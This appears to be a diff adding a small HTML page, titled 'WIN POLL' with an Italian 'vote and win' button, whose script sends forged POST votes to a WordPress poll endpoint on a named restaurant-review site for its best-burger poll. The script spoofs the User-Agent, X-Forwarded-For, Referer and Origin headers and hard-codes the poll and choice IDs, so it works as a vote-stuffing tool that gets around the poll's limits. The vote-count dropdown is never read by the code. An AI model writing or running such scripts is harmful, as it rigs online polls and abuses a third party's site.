@@ -1,0 +1,64 @@
+<!doctype html>
+<html>
+<head>
+    <title> WIN POLL </title>
+    <meta charset="utf-8">
+    <meta name="googlebot" CONTENT="noarchive">
+    <meta name="robots" CONTENT="index,nofollow">
+    <meta http-equiv="cache-control" CONTENT="no-cache">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<style>
+body {
+    padding-top: 70px;
+/*    background: url(/static/img/homepage-img.jpg) no-repeat center center fixed; */
+/*    background: url({% block bgimage %}/static/img/homepage-img.jpg{% endblock %}); */
+/**    background-image:none;
+    background-repeat: no-repeat;
+    background-attachment: fixed;
+    background-position: 0px 0px;
+    background-size: cover;**/
+    background-color: #000000;
+    color: #ffffff;
+    font-size: 20px;
+}
+</style>
+</head>
+<body>
+<div class="container" >
+  <select name="votes" id="votes" style="background-color: black; color: white;">
+  <option value="30" selected>30</option>
+  <option value="60">60</option>
+  <option value="120">120</option>
+  <option value="180">180</option>
+  <option value="240">240</option>
+</select> </br>
+	     <button type="submit" id="submit" onclick="winpoll();">VOTA E VINCI</button>
+          </form>
+</div>
+    <script crossorigin="anonymous">
+function winpoll() {
+var url = "https://www.ilforchettiere.it/wp-admin/admin-ajax.php?action=totalpoll";
+var xhr = new XMLHttpRequest();
+xhr.open("POST", url);
+xhr.setRequestHeader("User-Agent", "Mozilla/5.0 (X11; OSX; rv:78.0) Gecko/20100101 Firefox/78.0");
+xhr.setRequestHeader("Accept", "*/*");
+xhr.setRequestHeader("X-Forwarded-For", "191.8.10.149");
+xhr.setRequestHeader("Referer", "https://www.ilforchettiere.it/poll/miglior-hamburgeria/");
+xhr.setRequestHeader("Origin", "https://www.ilforchettiere.it");
+/**xhr.setRequestHeader("Access-Control-Allow-Origin", "*");**/
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xhr.onreadystatechange = function () {
+   if (xhr.readyState === 4) {
+      console.log(xhr.status);
+      console.log(xhr.responseText);
+   }};
+
+var data = "totalpoll[choices][53fbc4f2-c862-4130-bc14-6635306f5569][]=a0893326-0c02-4db9-8d34-9407fd6c8ac6&totalpoll[screen]=vote&totalpoll[pollId]=31786&totalpoll[action]=vote";
+
+xhr.send(data);
+
+}
+</script>
+</body>
+</html>
